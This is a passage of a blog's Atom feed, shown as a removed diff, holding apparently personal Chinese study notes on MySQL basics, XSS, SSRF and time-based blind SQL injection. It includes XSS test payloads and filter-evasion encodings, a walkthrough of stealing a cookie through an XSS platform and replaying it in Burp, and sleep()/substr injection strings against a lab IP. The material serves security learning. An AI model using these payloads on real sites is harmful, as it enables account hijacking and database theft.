title="COLLATION_CHARACTER_SET_APPLICABILITY表："></a>COLLATION_CHARACTER_SET_APPLICABILITY表：</h6><p>指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。</p><h6 id="TABLE-CONSTRAINTS表："><a href="#TABLE-CONSTRAINTS表：" class="headerlink" title="TABLE_CONSTRAINTS表："></a>TABLE_CONSTRAINTS表：</h6><p>描述了存在约束的表。以及表的约束类型。</p><h6 id="KEY-COLUMN-USAGE表："><a href="#KEY-COLUMN-USAGE表：" class="headerlink" title="KEY_COLUMN_USAGE表："></a>KEY_COLUMN_USAGE表：</h6><p>描述了具有约束的键列。</p><h6 id="ROUTINES表："><a href="#ROUTINES表：" class="headerlink" title="ROUTINES表："></a>ROUTINES表：</h6><p>提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。</p><h6 id="VIEWS表："><a href="#VIEWS表：" class="headerlink" title="VIEWS表："></a>VIEWS表：</h6><p>给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。</p><h6 id="TRIGGERS表："><a href="#TRIGGERS表：" class="headerlink" title="TRIGGERS表："></a>TRIGGERS表：</h6><p>提供了关于触发程序的信息。必须有super权限才能查看该表</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;information-schema简介：&quot;&gt;&lt;a href=&quot;#information-schema简介：&quot; class=&quot;headerlink&quot; title=&quot;information_schema简介：&quot;&gt;&lt;/a&gt;information_schema简介：&lt;/
-      
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="数据库基础" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>MySQL基础命令</title>
-    <link href="http://yoursite.com/2019/08/09/MySQL%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"/>
-    <id>http://yoursite.com/2019/08/09/MySQL基本命令/</id>
-    <published>2019-08-09T14:48:08.617Z</published>
-    <updated>2019-08-09T14:58:53.035Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="MySql数据库操作基础"><a href="#MySql数据库操作基础" class="headerlink" title="MySql数据库操作基础"></a>MySql数据库操作基础</h1><p><code>#启动mysql服务器</code><br>：net start mysql</p><p><code>#关闭musql服务器</code>：net stop mysql</p><p><code>#显示数据库</code><br>：show databases；</p><p><code>#创建数据库</code><br>:create database test;</p><p><code>#删除数据库:</code> drop database test;</p><p><code>#使用该数据库</code><br>:use test;</p><p><code>#显示数据库中的表</code><br>:show tables;</p><p><code>#创建表</code>:</p><p>​    create table student(</p><p>​    id int auto_increment primary key,</p><p>​    name varchar(50),</p><p>​    sex varchar(20),</p><p>​    date varchar(50),</p><p>​    content varchar(10),</p><p>​    )default charset=utf8;</p><p><code>#删除表</code><br>:drop table student;</p><p><code>#查看表的结构</code><br>:describe student;  可以简写为desc student;</p><p><code>#插入数据</code></p><p>​    insert into student values(null,’aa’,’男’,’1988-10-2’,’……’);</p><p>​    insert into student values(null,’bb’,’女’,’1889-03-6’,’……’);</p><p>​    insert into student values(null,’cc’,’男’,’1889-08-8’,’……’);</p><p>​    insert into student values(null,’dd’,’女’,’1889-12-8’,’……’);</p><p>​    insert into student values(null,’ee’,’女’,’1889-09-6’,’……’);</p><p>​    insert into student values(null,’ff’,’null’,’1889-09-6’,’……’);</p><p><code>#查询表中的数据</code><br>:select * from student;<br>select id,name from student;</p><p><code>#修改某一条数据</code>: update student set sex=’男’ where id=4;</p><p><code>#删除数据</code><br>:delete from student where id=5;</p><p><code>#and 且</code>:</p><p>​    select * from student where date&gt;’1988’ and date&lt;’1995’;</p><p><code>#or 或</code>:</p><p>​    select * from student where date&lt;’1988’ or date&gt;’1995’;</p><p><code>#between</code>:</p><p>​    select * from student where date between ‘1988’ and ‘1995’;</p><p><code>#in 查询制定集合内的数据</code><br>:</p><p>​    select * from student where id in (1,3,5);</p><p><code>#排序 :升序(asc)和降序(desc)</code>：</p><p>​     select * from student order by id asc;</p><p><code>#分组查询 #聚合函数</code>:</p><p>​     select max(id),name,sex from student group by sex;</p><p>​    select min(date) from student;</p><p>​    select avg(id) as ‘求平均’ from student;</p><p>​    select count(*) from student;   #统计表中总数</p><p>​    select count(sex) from student;   #统计表中性别总数 </p><p>​    select sum(id) from student;  #id的和</p><p><code>#查询第i条以后到第j条的数据(不包括第i条)</code>:</p><p>​    select * from student limit 2,5;  #显示3-5条数据</p><p><code>#修改数据</code><br>:</p><p>​    update c set age=66 where id=2;</p><p>​    update c set name=’花花’,age=21,sex=’女’ where id=2<br>delete from c where age=21;</p><p><code>#常用查询语句</code>:</p><p>​    select name,age ,id from c</p><p>​    select * from c where age&gt;40 and age&lt;60;  #and</p><p>​    select * from c where age&lt;40 or age&lt;60;  #or</p><p>​    select * from c where age between 40 and 60 ;#between</p><p>​    select * from c where age in (30,48);   #in 查询指定集合内的数据</p><p>​    select * from c order by age desc;      #order by （升序,降序）</p><p><code>#分组查询</code><br>:</p><p>​    select name,max(age) from c group by sex;  #按性别查最大年龄</p><p><code>#聚合函数</code><br>:</p><p>​    select min(age) from c;</p><p>​    select avg(age) as ‘平均年龄 ‘ from c;</p><p>​    select count(*) from c;  #统计表中数据总数</p><p>​    select sum(age) from c;</p><p><code>#修改表的名字</code><br>:</p><p>​    alter table tbl_name rename to new_name</p><p>​    alter table c rename to a;</p><p><code>#表结构修改</code><br>:</p><p>​    create table test<br>(</p><p>​    id int not null auto_increment primary key, #设定主键</p><p>​    name varchar(20) not null default ‘NoName’, #设定默认值</p><p>​    department_id int not null,</p><p>​    position_id int not null,</p><p>​    unique (department_id,position_id) #设定唯一值</p><p>​    );</p><p><code>#向表中增加一个字段(列)</code><br>:</p><p>​    alter table tablename add columnname type;</p><p>​    alter table tablename add(columnname type);</p><p>​    alter table test add  columnname varchar(20);</p><p><code>#修改表中某个字段的名字</code><br>:</p><p>​    alter table tablename change columnname newcolumnname type;</p><p>​    alter table test change name uname varchar(50);</p><p><code>#表position 增加列</code>:</p><p>​    test<br>alter table position add(test char(10));</p><p><code>#表position 修改列test</code><br>:</p><p>​    alter table position modify test char(20) not null;</p><p><code>#表position 修改列test默认值</code>:</p><p>​    alter table position alter test set default ‘system’;</p><p><code>#表position 去掉test 默认值</code><br>:</p><p>​    alter table position alter test drop default;</p><p><code>#表position 去掉列test</code><br>:</p><p>​    alter table position drop column test;</p><p><code>#表depart_pos 删除主键</code><br>:</p><p>​    alter table depart_pos drop primary key;</p><p><code>#表depart_pos 增加主键</code><br>:</p><p>​    alter table depart_pos add primary key PK_depart_pos<br>(department_id,position_id);</p><p><code>#用文本方式将数据装入数据库表中</code>:</p><p>​    load data local infile “D:/mysql.txt” into table MYTABLE;</p><p><code>#导入.sql文件</code>:</p><p>​    source d:/mysql.sql;  #或者  /. d:/mysql.sql;</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;MySql数据库操作基础&quot;&gt;&lt;a href=&quot;#MySql数据库操作基础&quot; class=&quot;headerlink&quot; title=&quot;MySql数据库操作基础&quot;&gt;&lt;/a&gt;MySql数据库操作基础&lt;/h1&gt;&lt;p&gt;&lt;code&gt;#启动mysql服务器&lt;/code&gt;&lt;br&gt;：n
-      
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="数据库基础" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>XSS应用</title>
-    <link href="http://yoursite.com/2019/08/09/XSS%E5%BA%94%E7%94%A8/"/>
-    <id>http://yoursite.com/2019/08/09/XSS应用/</id>
-    <published>2019-08-09T14:48:02.736Z</published>
-    <updated>2019-08-14T15:07:39.165Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="搭建在线平台："><a href="#搭建在线平台：" class="headerlink" title="搭建在线平台："></a>搭建在线平台：</h1><p>网址：<a href="https://xsshs.cn/xss.php" target="_blank" rel="noopener">https://xsshs.cn/xss.php</a></p><p>注册并登录……</p><h1 id="生成项目："><a href="#生成项目：" class="headerlink" title="生成项目："></a>生成项目：</h1><h6 id="1、创建项目："><a href="#1、创建项目：" class="headerlink" title="1、创建项目："></a>1、创建项目：</h6><p>登陆成功后，在主界面点击找到我的项目，并点击创建</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zln48wnmj3074021gle.jpg" alt></p><h6 id="2、设置项目名称和描述："><a href="#2、设置项目名称和描述：" class="headerlink" title="2、设置项目名称和描述："></a>2、设置项目名称和描述：</h6><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zlnar41mj305e06qa9y.jpg" alt></p><h6 id="3、选择模块"><a href="#3、选择模块" class="headerlink" title="3、选择模块:"></a>3、选择模块:</h6><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zlninrlsj308u09674j.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zlnp9ugtj307703ujr8.jpg" alt></p><h6 id="4、选择攻击代码并点击完成："><a href="#4、选择攻击代码并点击完成：" class="headerlink" title="4、选择攻击代码并点击完成："></a>4、选择攻击代码并点击完成：</h6><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zlnyircxj30mu0k8gmv.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zlotabanj30mx03djrc.jpg" alt></p><h1 id="攻击目标网站："><a href="#攻击目标网站：" class="headerlink" title="攻击目标网站："></a>攻击目标网站：</h1><h6 id="1、将上面复制的攻击代码粘贴到输入框，并提交"><a href="#1、将上面复制的攻击代码粘贴到输入框，并提交" class="headerlink" title="1、将上面复制的攻击代码粘贴到输入框，并提交"></a>1、将上面复制的攻击代码粘贴到输入框，并提交</h6><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zlp4wh6qj30af01s743.jpg" alt></p><h6 id="2、查看创建的项目，发现有一条新的内容"><a href="#2、查看创建的项目，发现有一条新的内容" class="headerlink" title="2、查看创建的项目，发现有一条新的内容"></a>2、查看创建的项目，发现有一条新的内容</h6><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zlpck744j30mo06y3yr.jpg" alt></p><h6 id="3、点击展开，查看有用信息"><a href="#3、点击展开，查看有用信息" class="headerlink" title="3、点击展开，查看有用信息"></a>3、点击展开，查看有用信息</h6><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zlpkwf61j30mf0a1q3s.jpg" alt></p><p>这里已经拿到了cookie</p><h1 id="通过cookie登录网站："><a href="#通过cookie登录网站：" class="headerlink" title="通过cookie登录网站："></a>通过cookie登录网站：</h1><h6 id="1、利用burp对登陆页面进行抓包"><a href="#1、利用burp对登陆页面进行抓包" class="headerlink" title="1、利用burp对登陆页面进行抓包"></a>1、利用burp对登陆页面进行抓包</h6><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zlpwkkwdj30g004bjrp.jpg" alt></p><h6 id="2、将盗取到的cookie替换包内的cookie"><a href="#2、将盗取到的cookie替换包内的cookie" class="headerlink" title="2、将盗取到的cookie替换包内的cookie"></a>2、将盗取到的cookie替换包内的cookie</h6><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zlq4xdofj30h204874k.jpg" alt></p><h6 id="3、放包，登陆成功"><a href="#3、放包，登陆成功" class="headerlink" title="3、放包，登陆成功"></a>3、放包，登陆成功</h6>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;搭建在线平台：&quot;&gt;&lt;a href=&quot;#搭建在线平台：&quot; class=&quot;headerlink&quot; title=&quot;搭建在线平台：&quot;&gt;&lt;/a&gt;搭建在线平台：&lt;/h1&gt;&lt;p&gt;网址：&lt;a href=&quot;https://xsshs.cn/xss.php&quot; target=&quot;_bla
-      
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>XSS进阶</title>
-    <link href="http://yoursite.com/2019/08/09/XSS%E8%BF%9B%E9%98%B6/"/>
-    <id>http://yoursite.com/2019/08/09/XSS进阶/</id>
-    <published>2019-08-09T14:48:02.721Z</published>
-    <updated>2019-08-15T12:06:42.993Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="XSS常见测试语句："><a href="#XSS常见测试语句：" class="headerlink" title="XSS常见测试语句："></a>XSS常见测试语句：</h1><p><code>&lt;scrip&gt;alert(/xss/)&lt;/scrip&gt;</code></p><p><code>&lt;img src=x onerror=alert(/xss/)&gt;</code></p><p><code>&lt;svg onload=alert(xss/)&gt;</code></p><p><code>&lt;a href=javascript:alert(/xss/)&gt;</code></p><h1 id="常见编码方式："><a href="#常见编码方式：" class="headerlink" title="常见编码方式："></a>常见编码方式：</h1><h3 id="1、JS编码："><a href="#1、JS编码：" class="headerlink" title="1、JS编码："></a>1、JS编码：</h3><p>JS提供了四种字符编码的策略，</p><p>三个八进制数字，如果个数不够，在前面补0，列如:”e”的编码为“\145”.</p><p>两个十六进制数字，如果个数不够，在前面补0，列如“e”的编码为“\x65”.</p><p>四个十六进制数字，如果个数不够，在前面补0，列如“e”的编码为“\u0065”</p><p>对于一些控制字‘符，使用特殊的C类型的转义风格（例如\n和\r）</p><h3 id="2、HTML-实体编码："><a href="#2、HTML-实体编码：" class="headerlink" title="2、HTML 实体编码："></a>2、HTML 实体编码：</h3><p>命名实体：以&amp;开头，以分号结尾的，列如“&lt;”的编码是“&amp;lt“.</p><p>字符编码：十进制，十六进制ASCII码或Unicode字符编码，样式为“&amp;#数值；“，</p><p>列如“&lt;“ 可以编码为”&#060;“和 ”&amp;#x3c；“</p><h3 id="3、URL-编码"><a href="#3、URL-编码" class="headerlink" title="3、URL 编码"></a>3、URL 编码</h3><p>这里的URL编码，也是两次URL全编码的结果。如果alert被过滤，</p><p>结果为:<code>%25%36%31%25%36%43%25%36%35%25%37%32%25%37%34</code></p><p>在使用XSS编码测试时，需要考虑HTML渲染的顺序，特别是针对多种编码组合时，要选择合适的编码方式进行测试。</p><h1 id="XSS漏洞修复建议"><a href="#XSS漏洞修复建议" class="headerlink" title="XSS漏洞修复建议"></a>XSS漏洞修复建议</h1><p>因为XSS漏洞涉及输入和输出两部分，所以其修复也分为两种。</p><p>过滤输入的数据，包括<code>““” “&lt;“ “&gt;” “on”</code>等非法字符。</p><p>对输出到页面的数据进行相应的编码转换，包括HTML实体编码，JavaScript 编码等。</p><h3 id="参考（侵删）："><a href="#参考（侵删）：" class="headerlink" title="参考（侵删）："></a>参考（侵删）：</h3><p><a href="https://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/153055.html</a></p><h3 id="在线生成js代码网站"><a href="#在线生成js代码网站" class="headerlink" title="在线生成js代码网站:"></a>在线生成js代码网站:</h3><p><a href="https://xsshs.cn/xss.php" target="_blank" rel="noopener">https://xsshs.cn/xss.php</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;XSS常见测试语句：&quot;&gt;&lt;a href=&quot;#XSS常见测试语句：&quot; class=&quot;headerlink&quot; title=&quot;XSS常见测试语句：&quot;&gt;&lt;/a&gt;XSS常见测试语句：&lt;/h1&gt;&lt;p&gt;&lt;code&gt;&amp;lt;scrip&amp;gt;alert(/xss/)&amp;lt;/sc
-      
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>XSS基础知识</title>
-    <link href="http://yoursite.com/2019/08/09/XSS%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
-    <id>http://yoursite.com/2019/08/09/XSS基础知识/</id>
-    <published>2019-08-09T14:48:02.711Z</published>
-    <updated>2019-08-15T12:06:17.592Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="XSS概念："><a href="#XSS概念：" class="headerlink" title="XSS概念："></a>XSS概念：</h1><p>XSS(Cross Site Script)名为跨站脚本攻击，为了与层叠样式表CSS区分，将跨站脚本简写为XSS，主要危害是盗取用户信息，钓鱼，制造蠕虫等。</p><p>黑客通过HTML注入篡改了网页，插入了恶意脚本，从而在用户浏览网页时，实现控制用户浏览器行为的一种攻击方式。</p><p>黑客可以利用XSS盗取用户cookie，有了用户的cookie，可以使用用户的身份来正常访问站点。</p><p>XSS属于客户端代码注入，通常注入代码是JavaScript，区别于命令注入，SQL注入属于服务端代码注入。</p><h1 id="判断是否存在XSS："><a href="#判断是否存在XSS：" class="headerlink" title="判断是否存在XSS："></a>判断是否存在XSS：</h1><p>可以通过输入构造的JavaScript代码，看页面是否能够弹出构造的弹窗。</p><p>例：<code>&lt;script&gt;alert(123)&lt;/script&gt;</code></p><p>​       <code>&lt;image src=&quot;&quot; onerror=&quot;alert(&#39;123&#39;)&quot;&gt;</code></p><p>​       </p><h1 id="XSS分类："><a href="#XSS分类：" class="headerlink" title="XSS分类："></a>XSS分类：</h1><p>XSS根据效果的不同，可以分为反射型XSS，存储型XSS。DOM型XSS</p><h3 id="1、反射型XSS："><a href="#1、反射型XSS：" class="headerlink" title="1、反射型XSS："></a>1、反射型XSS：</h3><p>反射型XSS又称为非持久性XSS。</p><p>攻击方式：攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户当目标用户访问该链接时，服务器接受该目标用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zm6wz752j30qx099go2.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zm8elg0gj311l0m3dn9.jpg" alt></p><h3 id="2、存储型XSS："><a href="#2、存储型XSS：" class="headerlink" title="2、存储型XSS："></a>2、存储型XSS：</h3><p>存储型XSS又称为持久性XSS，攻击脚本将被永久地存放在服务器的数据库或文件中，具有很高的隐蔽性。</p><p>攻击方式：这种攻击多见于论坛，博客和留言板，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行。</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zm8qwsu3j30wq08xdjv.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zm98387zj30oj09mdjd.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zm9ioxc4j313h0lsdnr.jpg" alt></p><h3 id="3、DOM型XSS："><a href="#3、DOM型XSS：" class="headerlink" title="3、DOM型XSS："></a>3、DOM型XSS：</h3><p>DOM 型xss其实是一种特殊类型的反射型xss它是基于DOM文档对象模型的一种漏洞。</p><p>攻击方式：用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含xss代码。服务器的响应不会以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致存在XSS漏洞。</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zm9tktsjj30nc0bb0ul.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zmaf1egrj31280lsahy.jpg" alt></p><h3 id="三种不同类型的XSS之间的区别："><a href="#三种不同类型的XSS之间的区别：" class="headerlink" title="*三种不同类型的XSS之间的区别："></a>*三种不同类型的XSS之间的区别：</h3><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zmaltrs3j30m3096n02.jpg" alt></p><h1 id="XSS常见攻击："><a href="#XSS常见攻击：" class="headerlink" title="XSS常见攻击："></a>XSS常见攻击：</h1><p>盗取cookie</p><p>获得位置信息</p><p>……</p><h3 id="参考（侵删）"><a href="#参考（侵删）" class="headerlink" title="参考（侵删）:"></a>参考（侵删）:</h3><p><a href="https://blog.csdn.net/extremebingo/article/details/81176394" target="_blank" rel="noopener">https://blog.csdn.net/extremebingo/article/details/81176394</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;XSS概念：&quot;&gt;&lt;a href=&quot;#XSS概念：&quot; class=&quot;headerlink&quot; title=&quot;XSS概念：&quot;&gt;&lt;/a&gt;XSS概念：&lt;/h1&gt;&lt;p&gt;XSS(Cross Site Script)名为跨站脚本攻击，为了与层叠样式表CSS区分，将跨站脚本简写为X
-      
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>SSRF</title>
-    <link href="http://yoursite.com/2019/08/09/SSRF/"/>
-    <id>http://yoursite.com/2019/08/09/SSRF/</id>
-    <published>2019-08-09T14:47:56.380Z</published>
-    <updated>2019-08-15T12:06:03.459Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="SSRF概念："><a href="#SSRF概念：" class="headerlink" title="SSRF概念："></a>SSRF概念：</h1><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人）</p><h1 id="SSRF漏洞产生原因："><a href="#SSRF漏洞产生原因：" class="headerlink" title="SSRF漏洞产生原因："></a>SSRF漏洞产生原因：</h1><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。</p><p>首先，我们要对目标网站的架构了解。比如 ： A网站，是一个所有人都可以访问的外网网站，B网站是一个他们内部的OA网站。</p><p>所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以同过a网站做中间人，访问b网站，从而达到攻击b网站需求。</p><p>正常用户访问网站的流程是：<br>输入A网站URL –&gt; 发送请求 –&gt; A服务器接受请求（没有过滤），并处理 –&gt;返回用户响应。</p><p>那网站有个请求是<a href="http://www.baidu,com/xxx.php?image=URL" target="_blank" rel="noopener">www.baidu,com/xxx.php?image=URL</a></p><p>那么产生SSRF漏洞的环节在哪里呢？安全的网站应接收请求后，检测请求的合法性。</p><p>产生的原因：服务器端的验证并没有对其请求获取图片的参数（image=）做出严格的过滤以及限制，导致A网站可以从其他服务器的获取数据<br>。</p><p>例如：<br><a href="http://www.baidu.com/xxx.php?image=www.abc.com/1.jpg" target="_blank" rel="noopener">www.baidu.com/xxx.php?image=www.abc.com/1.jpg</a></p><p>如果我们将<a href="http://www.abd.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？" target="_blank" rel="noopener">www.abd.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？</a><br>如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码</p><p>终极简析: SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。</p><h1 id="SSRF用途："><a href="#SSRF用途：" class="headerlink" title="SSRF用途："></a>SSRF用途：</h1><p>*内外网的端口和服务扫描</p><p>*主机本地敏感数据的读取</p><p>*内外网主机应用程序漏洞利用</p><p>*内外Web站点漏洞的利用</p><h1 id="SSRF漏洞的寻找："><a href="#SSRF漏洞的寻找：" class="headerlink" title="SSRF漏洞的寻找："></a>SSRF漏洞的寻找：</h1><p>*通过URL地址分享网页内容</p><p>*转码服务</p><p>*在线翻译</p><p>*通过URL地址加载或下载图片</p><p>*图片，文章收藏功能</p><p>*未公开的api实现以及其他调用URL功能</p><p>*从URL关键字中寻找</p><p>​    如：share，wap，url，link，src，source，target，u，3g，display，sourceURL，imageURL，domain……</p><h1 id="SSRF漏洞验证方法："><a href="#SSRF漏洞验证方法：" class="headerlink" title="SSRF漏洞验证方法："></a>SSRF漏洞验证方法：</h1><p>*因为SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器端发送的，从而判断是否存在SSRF漏洞</p><p>*在页面源码中查找访问的资源地址，如果该资源地址类型为<a href="http://www.baidu.com/xxx.php?image=(地址)的就可能存在SSRF漏洞" target="_blank" rel="noopener">www.baidu.com/xxx.php?image=(地址)的就可能存在SSRF漏洞</a></p><h3 id="参考（侵删）："><a href="#参考（侵删）：" class="headerlink" title="参考（侵删）："></a>参考（侵删）：</h3><p><a href="https://www.jianshu.com/p/d1d1c40f6d4c" target="_blank" rel="noopener">https://www.jianshu.com/p/d1d1c40f6d4c</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;SSRF概念：&quot;&gt;&lt;a href=&quot;#SSRF概念：&quot; class=&quot;headerlink&quot; title=&quot;SSRF概念：&quot;&gt;&lt;/a&gt;SSRF概念：&lt;/h1&gt;&lt;p&gt;SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者
-      
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="SSRF" scheme="http://yoursite.com/tags/SSRF/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>时间盲注</title>
-    <link href="http://yoursite.com/2019/08/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
-    <id>http://yoursite.com/2019/08/09/时间盲注/</id>
-    <published>2019-08-09T14:47:44.690Z</published>
-    <updated>2019-08-09T14:59:41.388Z</updated>
-    
-    <content type="html"><![CDATA[<p>例：<a href="http://172.16.13.53/web/time.php" target="_blank" rel="noopener">http://172.16.13.53/web/time.php</a></p><p>*判断注入点及类型，见SQL注入基本知识-判断注入类型</p><h1 id="判断注入点及类型："><a href="#判断注入点及类型：" class="headerlink" title="判断注入点及类型："></a>判断注入点及类型：</h1><p><a href="http://172.16.13.53/web/time.php?id=1" target="_blank" rel="noopener">http://172.16.13.53/web/time.php?id=1</a> and sleep(5)</p><p>*通过页面响应时间判断存在哪种类型的注入</p><h1 id="判断数据库长度："><a href="#判断数据库长度：" class="headerlink" title="判断数据库长度："></a>判断数据库长度：</h1><p><a href="http://172.16.13.53/web/time.php?id=1" target="_blank" rel="noopener">http://172.16.13.53/web/time.php?id=1</a> and if(length(database())&gt;=1,sleep(3),1)</p><p>*if结构：if（x,y,z），若满足条件x，则执行y，否则执行z</p><h1 id="爆库名："><a href="#爆库名：" class="headerlink" title="爆库名："></a>爆库名：</h1><p><a href="http://172.16.13.53/web/time.php?id=1" target="_blank" rel="noopener">http://172.16.13.53/web/time.php?id=1</a> and if(substr(database(),1,1)=’t’,sleep(5),1)</p><p>*此处及以下操作需用到Burp，参考SQL注入基本知识-利用Burp进行盲注</p><h1 id="爆表名："><a href="#爆表名：" class="headerlink" title="爆表名："></a>爆表名：</h1><p><a href="http://172.16.13.53/web/time.php?id=1" target="_blank" rel="noopener">http://172.16.13.53/web/time.php?id=1</a> and if(substr((select table_name from information_schema.tables where table_schema=’test’ limit 0,1),1,1)=’i’,sleep(5),1)</p><h1 id="爆字段名："><a href="#爆字段名：" class="headerlink" title="爆字段名："></a>爆字段名：</h1><p><a href="http://172.16.13.53/web/time.php?id=1" target="_blank" rel="noopener">http://172.16.13.53/web/time.php?id=1</a> and if(substr((select column_name from information_schema.columns where table_schema=’test’  and table_name=’users’ limit 0,1),1,1)=’i’,sleep(5),1)</p><h1 id="爆数值："><a href="#爆数值：" class="headerlink" title="爆数值："></a>爆数值：</h1><p><a href="http://172.16.13.53/web/time.php?id=1" target="_blank" rel="noopener">http://172.16.13.53/web/time.php?id=1</a> and if(substr((select id from test.users limit 0,1),1,1)=’1’,sleep(5),1)</p><h3 id="要点："><a href="#要点：" class="headerlink" title="要点："></a>要点：</h3><p>*if结构语句的含义：if（x,y,z），若满足条件x，则执行y，否则执行z</p><p>*从爆库开始，后面的操作需借助Burp</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;例：&lt;a href=&quot;http://172.16.13.53/web/time.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://172.16.13.53/web/time.php&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;*判断注入点及类型，见SQL注入基
-      
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>联合注入</title>
-    <link href="http://yoursite.com/2019/08/09/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
-    <id>http://yoursite.com/2019/08/09/联合注入/</id>
-    <published>2019-08-09T14:47:44.688Z</published>
-    <updated>2019-08-09T14:59:45.258Z</updated>
-    
